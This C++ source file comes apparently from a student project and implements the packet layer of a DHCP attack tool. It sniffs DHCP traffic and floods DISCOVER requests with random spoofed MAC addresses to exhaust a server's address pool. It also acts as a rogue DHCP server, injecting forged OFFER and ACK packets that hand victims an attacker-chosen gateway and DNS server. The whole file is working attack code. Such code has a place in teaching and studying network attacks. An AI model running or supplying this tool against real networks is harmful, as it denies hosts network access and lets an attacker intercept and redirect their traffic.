/**
  * packet handling class
  * author - Jan Pawlus (xpawlu00@stud.fit.vutbr.cz)
**/

#include "packet.hpp"

using namespace std;

/* get DHCP packet type form DHCP options */
static u_int16_t getPacketType(u_int8_t* options)
{
	int i = 0;
	u_int16_t value = 0;
	u_int16_t length = 0;	
	while(true)
	{
		value = (htons(options[i])) >> 8;
		if (value == MESSAGE_TYPE_DHCP)
		{
			value = ((htons(options[i+2])) >> 8);
			return value;
		}
		// got an END option
		else if (value == 255)
		{
			return 0;
		}
		else
		{
			length = (htons(options[i+1])) >> 8;
			i += 2 + length;
			continue;
		}
	}
}

/* get DHCP packet requested IP address from DHCP options */
static u_int32_t getReqIp(u_int8_t* options)
{
	int i = 0;
	u_int16_t value = 0;
	u_int16_t length = 0;
	ipv4_addr reqIp;
	while(true)
	{
		value = (htons(options[i])) >> 8;
		if (value == MESSAGE_TYPE_REQ_IP)
		{
			int a, b, c, d;
			a = ((htons(options[i+2])) >> 8);
			b = ((htons(options[i+3])) >> 8);
			c = ((htons(options[i+4])) >> 8);
			d = ((htons(options[i+5])) >> 8);
			inet_pton(AF_INET, std::string(std::to_string(a) + "." + std::to_string(b) + "." + std::to_string(c) + "." + std::to_string(d)).c_str(), &(reqIp));
			return reqIp;
		}
		else if (value == 255)
		{
			return 0;
		}
		else
		{
			length = (htons(options[i+1])) >> 8;
			i += 2 + length;
			continue;
		}
	}
}

/* decode received packet as a server */
static void decodePacketServer(u_char*args, const struct pcap_pkthdr *header, const u_char *frame)
{
	Packet *packet=reinterpret_cast<Packet *>(args);
	struct ether_header *eframe = (struct ether_header *)frame;
	//if we got IP packet
	if (htons(eframe->ether_type) == ETHERTYPE_IP) {
		struct ip* ipPacket = (struct ip *)(frame + sizeof(struct ether_header));  
		/* if we got UDP datagram */	  
		if (ipPacket->ip_p == IPPROTO_UDP) {
			struct udphdr* udpDatagram = (struct udphdr *)((char *)ipPacket + sizeof(struct ip));
			//if we got a DHCP request to server
			if (ntohs(udpDatagram->uh_dport) == DHCP_SERVER_PORT)
			{
				dhcp_packet* dhcpPacket = (dhcp_packet*)((char*)udpDatagram + sizeof(struct udphdr));
				if (dhcpPacket->op != 1)
					return;
				protocolIp prot;
				prot.messageType = getPacketType(&dhcpPacket->bp_options[0]);
				prot.xid = dhcpPacket->xid;
				//if we got DHCP request, get requested IP
				if (prot.messageType == DHCP_REQUEST)
				{
					prot.proposedIp = getReqIp(&dhcpPacket->bp_options[0]);
				}
				memcpy(prot.mac, dhcpPacket->chaddr, ETHER_ADDR_LEN);
				(packet->m).lock();
				packet->protocol.emplace_back(prot);
				(packet->m).unlock();
			}
		}
	}
}

/* decode received packet as an attacker */
static void decodePacketClient(u_char*args, const struct pcap_pkthdr *header, const u_char *frame)
{
	Packet *packet=reinterpret_cast<Packet *>(args);
	struct ether_header *eframe = (struct ether_header *)frame;
	if (htons(eframe->ether_type) == ETHERTYPE_IP) {
		struct ip* ipPacket = (struct ip *)(frame + sizeof(struct ether_header));		
		if (ipPacket->ip_p == IPPROTO_UDP) {
			struct udphdr* udpDatagram = (struct udphdr *)((char *)ipPacket + sizeof(struct ip));
			if (ntohs(udpDatagram->uh_sport) == DHCP_SERVER_PORT)
			{
				dhcp_packet* dhcpPacket = (dhcp_packet*)((char*)udpDatagram + sizeof(struct udphdr));
				if (dhcpPacket->op != DHCP_OFFER)
					return;
				protocolIp prot;
				u_int16_t packetType = getPacketType(&dhcpPacket->bp_options[0]);
				//we only care about DHCP offer as an attacker
				if (packetType != DHCP_OFFER)
					return;
				memcpy(prot.mac, dhcpPacket->chaddr, ETHER_ADDR_LEN);
				prot.proposedIp = dhcpPacket->yiaddr;
				prot.serverIp = ipPacket->ip_src.s_addr;
				(packet->m).lock();
				packet->protocol.emplace_back(prot);
				(packet->m).unlock();
			}
		}
	}
}

/* constructor that sets the pcap handle and pointers to the packet's layers */
Packet::Packet(pcap_t* pcap) 
{
	srand(time(NULL));
	this->pcap_handle = pcap;
	ip_header = (struct ip *)(packet + sizeof(struct ether_header));
	udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
	dhcp = (dhcp_packet *)(((char *)udp_header) + sizeof(struct udphdr));
}

/* function that sets the DHCP filter and sniffs for DHCP traffic */
void Packet::clientListener() 
{
	struct bpf_program fp;
	if (pcap_compile(pcap_handle, &fp, "port 67", 0, 0) == -1) {
		cerr << "Pcap filter error \n";
	}
	if (pcap_setfilter(pcap_handle, &fp) == -1) {
		cerr << "Pcap filter install error\n";
	}
	pcap_loop(pcap_handle, -1, decodePacketClient, reinterpret_cast<u_char*>(this));
	return;
}

/* method that starts listening to packets (listening thread) */
void Packet::serverListener(serverParams params) 
{
	this->params = params;
	struct bpf_program fp;
	if (pcap_compile(pcap_handle, &fp, "port 68", 0, 0) == -1) {
		cerr << "Pcap filter error \n";
	}
	if (pcap_setfilter(pcap_handle, &fp) == -1) {
		cerr << "Pcap filter install error\n";
	}
	for (int i = 0; i <= 5; i++)
	{
		if (i == 0)
			this->serverMac[i] = ((rand() % 255) & 0x3c);
		else 
			this->serverMac[i] = (rand() % 255);
	}
	pcap_loop(pcap_handle, -1, decodePacketServer, reinterpret_cast<u_char*>(this));
	return;
}

/* method for creating the packet */
void Packet::createPacket(u_int8_t option, protocolIp data) 
{
	len = 0;
	u_int32_t leaseConverted = htonl(params.leaseTime);
	len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_DHCP, &option, sizeof(option));
	switch (option)
	{
		case DHCP_REQUEST:
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&data.proposedIp, sizeof(data.proposedIp));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_SERVER_IP, (u_int8_t *)&data.serverIp, sizeof(data.serverIp));
			
			break;
		case DHCP_OFFER:
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_MASK, (u_int8_t *)&params.mask, sizeof(params.mask));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_ROUTER, (u_int8_t *)&params.gateway, sizeof(params.gateway));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_DNS, (u_int8_t *)&params.dnsServer, sizeof(params.dnsServer));			
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_LEASE_TIME, (u_int8_t *)&(leaseConverted), sizeof(leaseConverted));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_DOMAIN_NAME, (u_int8_t *)(params.domain), sizeof(char)*strlen(params.domain));
			break;
		case DHCP_DISCOVER:
			break;
		case DHCP_ACK:
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_MASK, (u_int8_t *)&params.mask, sizeof(params.mask));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_ROUTER, (u_int8_t *)&params.gateway, sizeof(params.gateway));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_DNS, (u_int8_t *)&params.dnsServer, sizeof(params.dnsServer));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_LEASE_TIME, (u_int8_t *)&(leaseConverted), sizeof(leaseConverted));
			len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_DOMAIN_NAME, (u_int8_t *)(params.domain), sizeof(char)*strlen(params.domain));
			break;
		default:
			break;

	}
	u_int8_t end = 0;
	len += this->fillOption(&dhcp->bp_options[len], MESSAGE_TYPE_END, &end, sizeof(end));
	len += sizeof(dhcp_packet);
	memset(dhcp, 0, sizeof(dhcp_packet));
	switch (option)
	{
		case DHCP_REQUEST:
			dhcp->op = DHCP_BOOTREQUEST;
			memcpy(dhcp->chaddr, data.mac, ETHER_ADDR_LEN);
			break;
		case DHCP_OFFER:
			dhcp->op = DHCP_BOOTREPLY;
			dhcp->xid = data.xid;
			dhcp->yiaddr = data.proposedIp;
			memcpy(dhcp->chaddr, data.mac, ETHER_ADDR_LEN);
			break;
		case DHCP_DISCOVER:
			dhcp->op = DHCP_BOOTREQUEST;
            //spoof MAC
			for (int i = 0; i <= 5; i++)
			{
				if (i == 0)
					dhcp->chaddr[i] = ((rand() % 255) & 0x3c);
				else 
					dhcp->chaddr[i] = (rand() % 255);
			}
			break;
		case DHCP_ACK:
			dhcp->op = DHCP_BOOTREPLY;
			dhcp->xid = data.xid;
			dhcp->yiaddr = data.proposedIp;
			memcpy(dhcp->chaddr, data.mac, ETHER_ADDR_LEN);
			break;
	}
	dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
	dhcp->hlen = 6;
	dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
    //broadcast flag
	dhcp->flags = htons(0x8000);
	//UDP datagram fill
	len += sizeof(struct udphdr);  
	udp_header->uh_sum = 0; 
	if (option == DHCP_DISCOVER || option == DHCP_REQUEST)
	{
		udp_header->uh_sport = htons(DHCP_CLIENT_PORT);
		udp_header->uh_dport = htons(DHCP_SERVER_PORT);
	} 
	else
	{
		udp_header->uh_dport = htons(DHCP_CLIENT_PORT);
		udp_header->uh_sport = htons(DHCP_SERVER_PORT);
	}	
	udp_header->uh_ulen = htons(len);
	//IP packet   
	len += sizeof(struct ip);
	ip_header->ip_hl = 5;
	ip_header->ip_v = IPVERSION;
	ip_header->ip_tos = 0x00;
	ip_header->ip_id = htonl(0xffff);
	ip_header->ip_off = 0;
	ip_header->ip_ttl = 16;
	ip_header->ip_p = IPPROTO_UDP;
	ip_header->ip_sum = 0;
	ip_header->ip_src.s_addr = 0;
	ip_header->ip_dst.s_addr = 0xFFFFFFFF;	   
	ip_header->ip_len = htons(len);
	ip_header->ip_sum = this->in_cksum((unsigned short *) ip_header, sizeof(struct ip));
	//ethernet fill
	eframe = (struct ether_header *)packet;
	memset(eframe->ether_dhost, -1,  ETHER_ADDR_LEN);
	eframe->ether_type = htons(ETHERTYPE_IP);
	if (option == DHCP_DISCOVER || option == DHCP_REQUEST)
	{
		memcpy(eframe->ether_shost, dhcp->chaddr, ETHER_ADDR_LEN);
	}
	else
	{
		memcpy(eframe->ether_shost, this->serverMac, ETHER_ADDR_LEN);
	}
	len = len + sizeof(struct ether_header);
}

/* send packet */
void Packet::sendPacket()
{
	int result = pcap_inject(this->pcap_handle, this->packet, this->len);
	if (result <= 0)
	{
		char error[] = "Error sending packet: ";
		pcap_perror(this->pcap_handle, error);
	}
}

/* fill the DHCP option. Needs to return the length for keeping the packet's length */
/* dhcp header options solution - inspired from https://github.com/samueldotj/dhcp-client */
int Packet::fillOption(u_int8_t *packet, u_int8_t code, u_int8_t *data, u_int8_t len)
{
	packet[0] = code;
	if (code != MESSAGE_TYPE_END) {
		packet[1] = len;
		memcpy(&packet[2], data, len);
		return len + (sizeof(u_int8_t) * 2);
	} else {
		return sizeof(u_int8_t);
	}	
}

/* method for IP checksum copied from FreeBSD */
unsigned short Packet::in_cksum(unsigned short *addr, int len)
{
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;
	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}
	/* mop up an odd byte, if necessary */
	if (nleft == 1)
	{
		*(u_char *)(&answer) = *(u_char *) w;
		sum += answer;
	}
	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);	 /* add hi 16 to low 16 */
	sum += (sum >> 16);			 /* add carry */
	answer = ~sum;			  /* truncate to 16 bits */
	return (answer);
}


